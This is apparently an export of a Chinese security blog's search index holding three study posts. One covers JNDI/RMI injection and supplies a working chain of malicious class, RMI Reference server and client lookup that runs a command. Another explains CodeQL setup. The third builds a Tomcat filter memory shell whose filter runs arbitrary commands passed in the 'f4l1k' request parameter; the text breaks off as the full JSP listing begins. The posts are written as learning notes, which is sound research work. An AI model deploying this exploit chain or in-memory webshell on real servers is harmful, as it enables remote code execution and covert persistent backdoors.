<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>jndi注入</title>
      <link href="/2021/12/12/general/jndi%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/12/12/general/jndi%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间跟着P牛学了rmi，最近又出了个Log4j2核弹漏洞，就想着要把jndi学了，毕竟类似fastjson、shiro的漏洞都会用到。</p><h2 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JNDI(Java Naming and Directory Interface)</p><p>是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。通过调用<code>JNDI</code>的<code>API</code>应用程序可以定位资源和其他程序对象。<code>JNDI</code>是<code>Java EE</code>的重要部分，需要注意的是它并不只是包含了<code>DataSource(JDBC 数据源)</code>，<code>JNDI</code>可访问的现有的目录及服务有:DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。</p><p><img src="/2021/12/12/general/jndi%E6%B3%A8%E5%85%A5/jndiarch.jpg" alt="img"></p><h3 id="Naming-Server"><a href="#Naming-Server" class="headerlink" title="Naming Server"></a>Naming Server</h3><p>命名服务将名称和对象联系起来，使得我们可以用名称访问对象，命名系统中的对象可以是DNS记录中的名称、应用服务器中的EJB组件、LDAP（Lightweight Directory Access Protocol）中的用户Profile.</p><p>我们前面介绍rmi的时候，使用过<code>Naming.bind()</code>，这其实就是将名称和对象绑定起来</p><h3 id="Directory-Server"><a href="#Directory-Server" class="headerlink" title="Directory Server"></a>Directory Server</h3><p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p><h3 id="jndi如何使用"><a href="#jndi如何使用" class="headerlink" title="jndi如何使用"></a>jndi如何使用</h3><p>这里我们先介绍几个基础知识，主要参考了nice_0e3师傅的总结</p><h4 id="InitialContext"><a href="#InitialContext" class="headerlink" title="InitialContext"></a>InitialContext</h4><p>该类继承了Context 类，是jndi命名服务的入口点，其中包括了很多命名服务的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bind(Name name, Object obj) </span><br><span class="line">将名称绑定到对象。 </span><br><span class="line">list(String name) </span><br><span class="line">枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class="line">lookup(String name) </span><br><span class="line">检索命名对象。 </span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">将名称绑定到对象，覆盖任何现有绑定。 </span><br><span class="line">unbind(String name) </span><br><span class="line">取消绑定命名对象。 </span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InitialContext initContext = <span class="keyword">new</span> InitialContext();</span><br></pre></td></tr></table></figure><h4 id="References-引用"><a href="#References-引用" class="headerlink" title="References 引用"></a>References 引用</h4><p>这个类代表了对一个在命名/目录系统之外的对象的引用。</p><p>我们前面提到的rmi是在服务端执行的，那我们攻击针对的目标肯定是客户端，这时候我们就需要通过References来操作，那么该类就可以通过字节码的方式被客户端实例化</p><p>构造方法的介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Reference(String className) </span><br><span class="line">className - 这个引用所指向的对象的非空的类名。</span><br><span class="line">  </span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line">className - 这个引用所指向的对象的非空的类名。</span><br><span class="line">addr - 对象的非空的地址。</span><br><span class="line">  </span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line">className - 该引用所指向的对象的非空类名。</span><br><span class="line">factory - 对象的工厂的类名，可能为空。</span><br><span class="line">factoryLocation - 加载工厂的位置，可能为空（例如URL）。  </span><br><span class="line"></span><br><span class="line">Reference(String className, String factory, String factoryLocation) </span><br><span class="line">className - 这个引用所指向的对象的非空的类名。</span><br><span class="line">addr - 对象的非空值地址。</span><br><span class="line">factory - 对象的工厂的类名，可能为空。</span><br><span class="line">factoryLocation - 加载工厂的位置，可能为空（例如URL）。</span><br></pre></td></tr></table></figure><p>这里我们攻击时常用的构造方法为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reference ref = <span class="keyword">new</span> Reference(<span class="string">&quot;JndiExp1&quot;</span>,<span class="string">&quot;JndiExp2&quot;</span>,<span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们对应的参数为</p><ul><li>JndiExp1 — 类的名字，也就是我们服务端类名</li><li>JndiExp2 — 本地实例名，我们通过Reference本地实例化后的实例名</li><li><a href="http://127.0.0.1/">http://127.0.0.1/</a> — 服务端位置</li></ul><p>其他方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(int posn, RefAddr addr)</span><br><span class="line">将地址添加到索引posn的地址列表中。</span><br><span class="line">add(RefAddr addr)</span><br><span class="line">将地址添加到地址列表的末尾。</span><br><span class="line">clear()</span><br><span class="line">删除此引用中的所有地址。</span><br><span class="line">clone()</span><br><span class="line">使用其类名称地址列表，类工厂名称和类工厂位置制作此引用的副本。</span><br><span class="line">get(int posn)</span><br><span class="line">检索索引posn处的地址。</span><br><span class="line">get(String addrType)</span><br><span class="line">检索地址类型为“addrType”的第一个地址。</span><br><span class="line">getAll()</span><br><span class="line">检索此引用中的地址枚举。</span><br><span class="line">getClassName()</span><br><span class="line">检索此引用引用的对象的类名。</span><br><span class="line">getFactoryClassLocation()</span><br><span class="line">检索此引用所引用的对象的工厂位置。</span><br><span class="line">getFactoryClassName()</span><br><span class="line">检索此引用引用的对象的工厂的类名称。</span><br><span class="line">remove(int posn)</span><br><span class="line">从地址列表中删除索引posn处的地址。</span><br></pre></td></tr></table></figure><h2 id="Jndi-rmi"><a href="#Jndi-rmi" class="headerlink" title="Jndi + rmi"></a>Jndi + rmi</h2><p>首先我们先写一个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiExp</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process runtime = Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">            InputStream in = runtime.getInputStream();</span><br><span class="line">            BufferedReader bufferReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">            String read = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((read = bufferReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(read);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;exp is already&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将该类打包成class文件，并启动一个http服务</p><p><img src="/2021/12/12/general/jndi%E6%B3%A8%E5%85%A5/image-20211213131130878.png" alt="image-20211213131130878"></p><p>接着我们来写Rmi服务端，前面我们介绍过rmi，我们要先写一个servet注册服务，并将类注册</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException , NamingException , AlreadyBoundException </span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;http://127.0.0.1:8088/&quot;</span>;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference ref = <span class="keyword">new</span> Reference(<span class="string">&quot;Jndiexp&quot;</span>,<span class="string">&quot;JndiExp&quot;</span>,url); <span class="comment">//第一个参数任意，第二个参数对应我们的远程class名</span></span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;obj&quot;</span>,referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Rmi-Reference is already&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们使用Reference来达到本地执行命令的目的，但是我们注意到，我们又使用ReferenceWrapper将Reference封装了一下，前面我们说到rmi注册的服务类必须继承Remote和UnicastRemoteObject，而Reference并没有实现这两个接口，只能通过ReferenceWrapper去实现</p><p><img src="/2021/12/12/general/jndi%E6%B3%A8%E5%85%A5/image-20211213131607180.png" alt="image-20211213131607180"></p><p>接着我们写客户端，也就是利用InitialContext去实现jndi</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        InitialContext initContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        initContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/obj&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Rmi-Rerference client already&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/12/general/jndi%E6%B3%A8%E5%85%A5/image-20211213131733475.png" alt="image-20211213131733475"></p><p>成功弹出计算器，并且我们的http服务端也接收到了请求</p><p><img src="/2021/12/12/general/jndi%E6%B3%A8%E5%85%A5/image-20211213131802382.png" alt="image-20211213131802382"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/CoLo/p/15531591.html">https://www.cnblogs.com/CoLo/p/15531591.html</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/13958047.html">https://www.cnblogs.com/nice0e3/p/13958047.html</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>codql初次尝试</title>
      <link href="/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/"/>
      <url>/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>老是看师傅萌使用codeql来做代码审计，小菜鸡表示也想尝试尝试，刚好一时兴起，说干就干！</p><h3 id="codeql-介绍"><a href="#codeql-介绍" class="headerlink" title="codeql 介绍"></a>codeql 介绍</h3><p>CodeQL是一个分析引擎，被开发人员用来自动进行安全检查，也被安全研究人员用来进行变体分析。</p><p>对做安全的师傅来说其实就是帮助我们进行代码审计</p><h2 id="codeql使用"><a href="#codeql使用" class="headerlink" title="codeql使用"></a>codeql使用</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>首先将codeql已经编译好的程序下载到本地</p><p><a href="https://github.com/github/codeql-cli-binaries/releases">https://github.com/github/codeql-cli-binaries/releases</a> </p><p>再将ql的语言工具包下载到本地</p><p><a href="https://github.com/Semmle/ql">https://github.com/Semmle/ql</a></p><p>为了方便可以将codeql目录添加为环境变量</p><p>接着我们去vscode添加codeql插件</p><p><img src="/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/image-20211209201624643.png" alt="image-20211209201624643"></p><p>并点击插件设置</p><p><img src="/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/image-20211209204503677.png" alt="image-20211209204503677"></p><p>将codeql执行文件的<strong>可执行文件</strong>目录填入</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>我们借最近刚爆出的漏洞Grafana的任意文件读取为例</p><p>首先将原文件下载到本地并使用codeql编译</p><blockquote><p>codeql database create ~/Downloads/grafana –language=”go” –source-root=/Users/kai/Downloads/grafana-8.2.6</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">database create ~/Downloads/grafana 指的的是我们创建的数据库名称及位置 </span><br><span class="line"></span><br><span class="line"> --language=&quot;go&quot; 指的是我们程序的语言</span><br><span class="line">LanguageIdentifier</span><br><span class="line">C/C++    cpp</span><br><span class="line">C#      csharp</span><br><span class="line">Go      go</span><br><span class="line">Java    java</span><br><span class="line">JavaScript/TypeScriptjavascript</span><br><span class="line">Pythonpython</span><br><span class="line">Rubyruby</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--source-root=/Users/kai/Downloads/grafana-8.2.6 用于数据库创建的主要源文件的根文件夹。默认情况下，该命令假定当前目录是源根目录 - 使用此选项指定不同的位置。</span><br><span class="line"></span><br><span class="line">--db-cluster 当想要为一种以上语言创建数据库时，用于多语言代码库。</span><br><span class="line"></span><br><span class="line">--command 当为一种或多种编译语言创建数据库时使用，如果请求的唯一语言是 Python 和 JavaScript，则省略。这指定了调用编译器所需的构建命令。命令从当前文件夹运行，或者--source-root 如果指定。如果不包含--command，CodeQL 将尝试使用内置的自动构建器自动检测构建系统。</span><br><span class="line"></span><br><span class="line">--no-run-unnecessary-builds 用于--db-cluster抑制 CodeQL CLI 不需要监视构建的语言的构建命令（例如，Python 和 JavaScript/TypeScript）</span><br></pre></td></tr></table></figure><p>执行完之后，我们就生成了对应的数据库，接着我们去vscode导入</p><p>因为我们审计的是go，所以我们还要下载一个go的sdk</p><p><a href="https://github.com/github/codeql-go">https://github.com/github/codeql-go</a></p><p>下载之后执行scripts/install-deps.sh</p><p>然后在vscode中打开我们下载的这个codeql-go/ql/src并创建test.ql</p><p>接着导入刚刚生成的数据库</p><p><img src="/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/image-20211209204829256.png" alt="image-20211209204829256"></p><p>选择我们生成的文件夹，如下图就是导入成功了</p><p><img src="/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/image-20211209204906907.png" alt="image-20211209204906907"></p><p>接着我们写一个helloworld的demo</p><p><img src="/2021/12/09/general/codql%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/image-20211209211922293.png" alt="image-20211209211922293"></p><p>至此我们的安装到demo已经基本实现了</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://codeql.github.com/docs">https://codeql.github.com/docs</a></li><li><a href="https://www.freebuf.com/articles/web/283795.html">https://www.freebuf.com/articles/web/283795.html</a></li><li><a href="https://kiprey.github.io/2020/12/CodeQL-setup/">https://kiprey.github.io/2020/12/CodeQL-setup/</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>filter 内存马</title>
      <link href="/2021/12/04/java_study/java-day9/"/>
      <url>/2021/12/04/java_study/java-day9/</url>
      
        <content type="html"><![CDATA[<h2 id="filter-内存马"><a href="#filter-内存马" class="headerlink" title="filter 内存马"></a>filter 内存马</h2><p>上一篇我们介绍了一些基础知识。</p><p>我们正常使用内存马肯定不能去ServletContextListener中动态注册，我们基本职能在servlet中编辑或者上传jsp类的文件，那么我们该如何实现内存马呢</p><p>这个时候我们需要去分析一下加载filter的流程</p><p><img src="/2021/12/04/java_study/java-day9/image-20211205182725952.png" alt="image-20211205182725952"></p><p>我们需要先知道几个变量和类</p><p><strong>FilterDefs</strong>：存放FilterDef的数组 ，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p><p><strong>FilterConfigs</strong>：存放filterConfig的数组，在 <strong>FilterConfig</strong> 中主要存放 FilterDef 和 Filter对象等信息</p><p><strong>FilterMaps</strong>：存放FilterMap的数组，在 <strong>FilterMap</strong> 中主要存放了 FilterName 和 对应的URLPattern</p><p><strong>FilterChain</strong>：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</p><p><strong>WebXml</strong>：存放 web.xml 中内容的类</p><p><strong>ContextConfig</strong>：Web应用的上下文配置类</p><p><strong>StandardContext</strong>：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</p><p><strong>StandardWrapperValve</strong>：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</p><p>我们的入手方法是<code>StandardWrapperValve</code>类，我们在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ApplicationFilterChain filterChain =</span><br><span class="line">        ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure><p>打上断点进行调试，首先会调用createFilterChain方法</p><p>关键在83行，会从StandardContext获取context，然后从中来获取filter的映射，并将他交给filterMaps数组，filterMaps中存储的是我们filter的名字和映射</p><p><img src="/2021/12/04/java_study/java-day9/image-20211205180803162.png" alt="image-20211205180803162"></p><p><img src="/2021/12/04/java_study/java-day9/image-20211205180956463.png" alt="image-20211205180956463"></p><p>接着又会从context中获取filterConfig <img src="/2021/12/04/java_study/java-day9/image-20211205181502598.png" alt="image-20211205181502598"></p><p>判断filterConfig不为null之后会调用addFilter方法，我们接着跟进</p><p>首先会判断是否filter已经加载过，防止多次加载,然后会把我们的filter加载</p><p><img src="/2021/12/04/java_study/java-day9/image-20211205182035575.png" alt="image-20211205182035575"></p><p>组装完成后会回到ApplicationFilterChain中调用internalDoFilter方法</p><p><img src="/2021/12/04/java_study/java-day9/image-20211205182854002.png" alt="image-20211205182854002"></p><p>我们跟进之后会发现它会从filterConfig中读取我们的FilterDefs,然后去调用doFilter</p><p><img src="/2021/12/04/java_study/java-day9/image-20211205183228358.png" alt="image-20211205183228358"></p><p>从上面整个流程我们可以看出有三个比较关键的参数</p><blockquote><p>filterMaps</p><p>filterConfig</p><p>filterDef</p></blockquote><p>我们要想实现一个filter需要将他们放入context</p><p>那我们现在需要做的就是拿到context并将上面三个参数补全</p><p>因为我们需要获取到的是StandardContext类型的context，所以我们要反射两次</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取ApplicationContext类型context</span></span><br><span class="line">ServletContext context = request.getSession().getServletContext();</span><br><span class="line">Field scontext = context.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">scontext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">System.out.println(scontext.getType());</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) </span><br><span class="line">scontext.get(context);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取StandardContext类型context</span></span><br><span class="line">Field acontext = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">acontext.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">System.out.println(acontext);</span><br><span class="line">StandardContext standarContext = (StandardContext) </span><br><span class="line">acontext.get(applicationContext);</span><br></pre></td></tr></table></figure><p>接着我们去获取到filterConfigs</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field configs = standarContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Map filterConfigs = (Map) configs.get(standarContext);</span><br></pre></td></tr></table></figure><p>因为在StandardContext中存在addFilterMap和addFilterDef方法，所以我们只用创建FilterMap和FilterDef对象，再利用反射调用上述两个方法就可以了</p><p><img src="/2021/12/04/java_study/java-day9/image-20211205204716335.png" alt="image-20211205204716335"></p><p><img src="/2021/12/04/java_study/java-day9/image-20211205204628766.png" alt="image-20211205204628766"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123;</span><br><span class="line">  Filter filter = <span class="keyword">new</span> Filter()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse rep, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(req.getParameter(<span class="string">&quot;f4l1k&quot;</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">        Process run = Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;f4l1k&quot;</span>));</span><br><span class="line">        InputStream in = run.getInputStream();</span><br><span class="line">        BufferedReader bu =  <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">        String cmd = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((cmd = bu.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">          rep.getWriter().write(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      chain.doFilter(req,rep);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">  filterDef.setFilterName(name);</span><br><span class="line">  filterDef.setFilter(filter);</span><br><span class="line">  filterDef.setFilterClass(filter.getClass().getName()); <span class="comment">//相当于在web.xml中设置对应类</span></span><br><span class="line"></span><br><span class="line">  standarContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">  FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">  filterMap.setFilterName(name);</span><br><span class="line">  filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">  filterDef.setDescription(DispatcherType.REQUEST.name());<span class="comment">//动态加载设置Map时我们也设置过类似参数</span></span><br><span class="line"></span><br><span class="line">  standarContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure><p>到此我们只剩一个FilterConfig没有解决，filterConfigs的key也就是我们的Filtername，而value是一个ApplicationFilterConfig，又因为这是tomcat内部包，我们不能直接去创建对象，所以我们要利用反射的方式去调用该类，然后再推入filterConfigs</p><p><img src="/2021/12/04/java_study/java-day9/image-20211205203251944.png" alt="image-20211205203251944"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standarContext,filterDef);</span><br><span class="line">filterConfigs.put(name,filterConfig);</span><br></pre></td></tr></table></figure><p>最终完整的filter内存马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 